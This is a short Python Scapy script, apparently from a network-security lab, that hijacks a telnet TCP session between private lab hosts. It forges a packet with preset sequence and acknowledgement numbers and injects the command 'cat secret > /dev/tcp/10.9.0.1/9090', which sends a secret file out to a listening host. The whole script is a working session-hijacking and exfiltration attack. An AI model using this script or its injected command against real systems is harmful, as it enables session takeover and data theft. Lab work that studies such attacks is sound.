#!/bin/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=36902, dport=23, flags="A", seq=2934288588, ack=4232242032)
data = "\r cat secret >  /dev/tcp/10.9.0.1/9090 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, iface="br-9e26834070aa", verbose=0)


